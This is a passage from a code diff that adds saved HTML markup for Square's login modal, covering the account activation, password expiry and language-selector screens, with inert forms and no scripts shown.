+            <div class="login-modal-claim-account-change-password hide" style="display: none">
+              <div class="login-modal-logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 44 44" role="img">
+                  <path role="presentation" d="M36.65 0h-29.296c-4.061 0-7.354 3.292-7.354 7.354v29.296c0 4.062 3.293 7.354 7.354 7.354h29.296c4.062 0 7.354-3.292 7.354-7.354v-29.296c.001-4.062-3.291-7.354-7.354-7.354zm-.646 33.685c0 1.282-1.039 2.32-2.32 2.32h-23.359c-1.282 0-2.321-1.038-2.321-2.32v-23.36c0-1.282 1.039-2.321 2.321-2.321h23.359c1.281 0 2.32 1.039 2.32 2.321v23.36z"></path>
+                  <path role="presentation" d="M17.333 28.003c-.736 0-1.332-.6-1.332-1.339v-9.324c0-.739.596-1.339 1.332-1.339h9.338c.738 0 1.332.6 1.332 1.339v9.324c0 .739-.594 1.339-1.332 1.339h-9.338z"></path>
+                </svg>
+              </div>
+              <div class="login-modal-title">
+                Activate your new Square account
+              </div>
+              <div class="login-modal-content">
+                <form accept-charset="UTF-8" action="" method="post" novalidate="novalidate">
+                  <div class="login-modal-text">
+                    <div class="login-modal-secondary-text">
+                      Create a password that is at least 8-characters long.
+                    </div>
+                  </div>
+
+                  <div id="claim-account-flash" class="flash-message flash-message-failure flash-message-top login-modal-text" role="alert" style="display: none;">
+                  </div>
+
+                  <div class="field fade-label password-field field-combined-top">
+                    <label class="text" for="claim-account-password">New password</label>
+                    <input autocomplete="off" class="text" id="claim-account-password" size="30" type="password" value="">
+                  </div>
+
+                  <div class="field fade-label password-field field-combined-bottom">
+                    <label class="text" for="claim-account-confirm-password">Confirm password</label>
+                    <input autocomplete="off" class="text" id="claim-account-confirm-password" size="30" type="password" value="">
+                  </div>
+
+                  <div style="clear: both"></div>
+                  <div class="submit-button full-length-submit-button">
+                    <button type="submit" class="btn btn-blue track-event">
+                      <span class="button-text">Set Password</span>
+                    </button>
+                  </div>
+
+                  <input type="hidden" name="claim-account-person-token" id="claim-account-person-token" value="">
+                  <input type="hidden" name="claim-account-code" id="claim-account-code" value="">
+                </form>
+              </div>
+            </div>
+            <div class="login-modal-claim-account-change-complete hide" style="display: none">
+              <div class="login-modal-logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 44 44" role="img">
+                  <path role="presentation" d="M36.65 0h-29.296c-4.061 0-7.354 3.292-7.354 7.354v29.296c0 4.062 3.293 7.354 7.354 7.354h29.296c4.062 0 7.354-3.292 7.354-7.354v-29.296c.001-4.062-3.291-7.354-7.354-7.354zm-.646 33.685c0 1.282-1.039 2.32-2.32 2.32h-23.359c-1.282 0-2.321-1.038-2.321-2.32v-23.36c0-1.282 1.039-2.321 2.321-2.321h23.359c1.281 0 2.32 1.039 2.32 2.321v23.36z"></path>
+                  <path role="presentation" d="M17.333 28.003c-.736 0-1.332-.6-1.332-1.339v-9.324c0-.739.596-1.339 1.332-1.339h9.338c.738 0 1.332.6 1.332 1.339v9.324c0 .739-.594 1.339-1.332 1.339h-9.338z"></path>
+                </svg>
+              </div>
+              <div class="login-modal-title">
+                Account activation successful
+              </div>
+              <div class="login-modal-content">
+                <form accept-charset="UTF-8" action="" method="get" novalidate="novalidate">
+                  <div class="login-modal-text">
+                    <div class="login-modal-secondary-text">
+                        Your Square account has been successfully created. Continue to your Square Dashboard.
+                    </div>
+                  </div>
+
+                  <div style="clear: both"></div>
+                  <div class="submit-button full-length-submit-button">
+                    <button type="submit" class="btn btn-blue track-event">
+                      <span class="button-text">Continue</span>
+                    </button>
+                  </div>
+                </form>
+              </div>
+            </div>
+            <div class="login-modal-claim-account-change-complete-sign-in hide" style="display: none">
+              <div class="login-modal-logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 44 44" role="img">
+                  <path role="presentation" d="M36.65 0h-29.296c-4.061 0-7.354 3.292-7.354 7.354v29.296c0 4.062 3.293 7.354 7.354 7.354h29.296c4.062 0 7.354-3.292 7.354-7.354v-29.296c.001-4.062-3.291-7.354-7.354-7.354zm-.646 33.685c0 1.282-1.039 2.32-2.32 2.32h-23.359c-1.282 0-2.321-1.038-2.321-2.32v-23.36c0-1.282 1.039-2.321 2.321-2.321h23.359c1.281 0 2.32 1.039 2.32 2.321v23.36z"></path>
+                  <path role="presentation" d="M17.333 28.003c-.736 0-1.332-.6-1.332-1.339v-9.324c0-.739.596-1.339 1.332-1.339h9.338c.738 0 1.332.6 1.332 1.339v9.324c0 .739-.594 1.339-1.332 1.339h-9.338z"></path>
+                </svg>
+              </div>
+              <div class="login-modal-title">
+                Account activation successful
+              </div>
+              <div class="login-modal-content">
+                <form accept-charset="UTF-8" action="" method="get" novalidate="novalidate">
+                  <div class="login-modal-text">
+                    <div class="login-modal-secondary-text">
+                        Your Square account has been successfully created. Sign into your account to continue to your Square Dashboard.
+                    </div>
+                  </div>
+
+                  <div style="clear: both"></div>
+                  <div class="submit-button full-length-submit-button">
+                    <button type="submit" class="btn btn-blue track-event">
+                      <span class="button-text">Sign In</span>
+                    </button>
+                  </div>
+                </form>
+              </div>
+            </div>
+            <div class="login-modal-claim-account-password-exists hide" style="display: none">
+              <div class="login-modal-logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 44 44" role="img">
+                  <path role="presentation" d="M36.65 0h-29.296c-4.061 0-7.354 3.292-7.354 7.354v29.296c0 4.062 3.293 7.354 7.354 7.354h29.296c4.062 0 7.354-3.292 7.354-7.354v-29.296c.001-4.062-3.291-7.354-7.354-7.354zm-.646 33.685c0 1.282-1.039 2.32-2.32 2.32h-23.359c-1.282 0-2.321-1.038-2.321-2.32v-23.36c0-1.282 1.039-2.321 2.321-2.321h23.359c1.281 0 2.32 1.039 2.32 2.321v23.36z"></path>
+                  <path role="presentation" d="M17.333 28.003c-.736 0-1.332-.6-1.332-1.339v-9.324c0-.739.596-1.339 1.332-1.339h9.338c.738 0 1.332.6 1.332 1.339v9.324c0 .739-.594 1.339-1.332 1.339h-9.338z"></path>
+                </svg>
+              </div>
+              <div class="login-modal-title">
+                Account already activated
+              </div>
+              <div class="login-modal-content">
+                <form accept-charset="UTF-8" action="" method="get" novalidate="novalidate">
+                  <div class="login-modal-text">
+                    <div class="login-modal-secondary-text">
+                        Your Square account already has a password. Log in with your email address and password to continue to your Square Dashboard.
+                    </div>
+                  </div>
+
+                  <div style="clear: both"></div>
+                  <div class="submit-button full-length-submit-button">
+                    <button type="submit" class="btn btn-blue track-event">
+                      <span class="button-text">Sign In</span>
+                    </button>
+                  </div>
+                </form>
+              </div>
+            </div>
+
+            <div class="login-modal-message-password-expired hide" style="display: none">
+              <div class="login-modal-logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 44 44" role="img">
+                  <path role="presentation" d="M36.65 0h-29.296c-4.061 0-7.354 3.292-7.354 7.354v29.296c0 4.062 3.293 7.354 7.354 7.354h29.296c4.062 0 7.354-3.292 7.354-7.354v-29.296c.001-4.062-3.291-7.354-7.354-7.354zm-.646 33.685c0 1.282-1.039 2.32-2.32 2.32h-23.359c-1.282 0-2.321-1.038-2.321-2.32v-23.36c0-1.282 1.039-2.321 2.321-2.321h23.359c1.281 0 2.32 1.039 2.32 2.321v23.36z"></path>
+                  <path role="presentation" d="M17.333 28.003c-.736 0-1.332-.6-1.332-1.339v-9.324c0-.739.596-1.339 1.332-1.339h9.338c.738 0 1.332.6 1.332 1.339v9.324c0 .739-.594 1.339-1.332 1.339h-9.338z"></path>
+                </svg>
+              </div>
+              <div class="login-modal-title">Password Expired</div>
+              <div class="login-modal-content">
+                <div class="login-modal-text">
+                  <div class="login-modal-secondary-text">
+                    Your password has expired. You will need to reset your password before logging in to Square. <a href="https://squareup.com/help/article/6212" target="_blank" style="color: #2996cc;text-decoration: none">Learn More&nbsp;&gt;</a>
+                  </div>
+                </div>
+                <div class="submit-button full-length-submit-button">
+                  <button type="submit" class="forgot-password-link btn btn-blue track-event">
+                    <span class="button-text">Reset Password</span>
+                  </button>
+                </div>
+              </div>
+              <div class="login-modal-text login-modal-text-no-margin-bottom">
+                <div class="enroll-link">
+                  <a href="" class="login-link">Back to login</a>
+                </div>
+              </div>
+            </div>
+
+            <div class="login-modal-pending-account-lockout hide" style="display: none">
+              <div class="login-modal-logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 44 44" role="img">
+                  <path role="presentation" d="M36.65 0h-29.296c-4.061 0-7.354 3.292-7.354 7.354v29.296c0 4.062 3.293 7.354 7.354 7.354h29.296c4.062 0 7.354-3.292 7.354-7.354v-29.296c.001-4.062-3.291-7.354-7.354-7.354zm-.646 33.685c0 1.282-1.039 2.32-2.32 2.32h-23.359c-1.282 0-2.321-1.038-2.321-2.32v-23.36c0-1.282 1.039-2.321 2.321-2.321h23.359c1.281 0 2.32 1.039 2.32 2.321v23.36z"></path>
+                  <path role="presentation" d="M17.333 28.003c-.736 0-1.332-.6-1.332-1.339v-9.324c0-.739.596-1.339 1.332-1.339h9.338c.738 0 1.332.6 1.332 1.339v9.324c0 .739-.594 1.339-1.332 1.339h-9.338z"></path>
+                </svg>
+              </div>
+              <div class="login-modal-title">
+                Your Password Will Expire
+              </div>
+              <div class="login-modal-content">
+                <form accept-charset="UTF-8" action="" method="get" novalidate="novalidate">
+                  <div class="login-modal-text login-modal-text-small-margin-bottom">
+                    <div id="pending-account-lockout-will-expire" class="login-modal-secondary-text"></div>
+                  </div>
+                  <div class="login-modal-text">
+                    <div class="login-modal-secondary-text">
+                      If you do not update your password before it expires, you will be unable to log into Square. <a href="https://squareup.com/help/article/6212" target="_blank" style="color: #2996cc;text-decoration: none">Learn More&nbsp;&gt;</a>
+                    </div>
+                  </div>
+
+                  <div style="clear: both"></div>
+                  <div class="submit-button full-length-submit-button">
+                    <button type="submit" id="pending-account-lockout-reset-password" class="btn btn-blue track-event">
+                      <span class="button-text">Reset Password</span>
+                    </button>
+                  </div>
+                  <div class="submit-button full-length-submit-button">
+                    <button type="button" id="pending-account-lockout-continue" class="btn btn-blue inverse track-event">
+                      <span class="button-text">Continue</span>
+                    </button>
+                  </div>
+                </form>
+              </div>
+            </div>
+
+          </section>
+          <div class="login-modal-footer login-language-wrapper">
+            
+<div class="language-selector">
+  <div class="language-prompt">
+    <ul class="reset locale-list language-list">
+         <li class="language " data-language="en"><span>English</span></li>
+         <li class="language au" data-language="en-AU"><span>English (Australia)</span></li>
+         <li class="language ca" data-language="en-CA"><span>English (Canada)</span></li>
+         <li class="language ie" data-language="en-IE"><span>English (Ireland)</span></li>
+         <li class="language gb" data-language="en-GB"><span>English (United Kingdom)</span></li>
+         <li class="language " data-language="es"><span>español</span></li>
+         <li class="language ca" data-language="fr-CA"><span>français (Canada)</span></li>
+         <li class="language fr" data-language="fr-FR"><span>français (France)</span></li>
+         <li class="language " data-language="ja"><span>日本語</span></li>
+    </ul>
+  </div>
+  <a href="#" class="arrow selected-language en">English</a>
+</div>
+
+          </div>
+      </div>
+    </div>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+  
+
+</div><div id="ads"></div><div id="ads"></div><span id="und-addon-container" data-w="36px" data-h="73px" style="height: 73px; width: 36px; inset: 50% 0px auto auto; margin-left: 0px; margin-top: -36px; padding-left: 0px; padding-right: 0px; padding-top: 0px; display: none;"><span id="und-addon-btn-up" class="und-addon-btn und-addon-side-right und-addon-hovers" style="background-image: url(&quot;chrome-extension://dbofniohnfjigodceiebfkcfdhncnici/img/arrow-up.svg&quot;); opacity: 0.4; width: 36px; height: 36px; display: none;"></span><span id="und-addon-btn-dn" class="und-addon-btn und-addon-side-right und-addon-hovers" style="background-image: url(&quot;chrome-extension://dbofniohnfjigodceiebfkcfdhncnici/img/arrow-dn.svg&quot;); opacity: 0.4; width: 36px; height: 36px; display: none;"></span></span>
+</body></html>
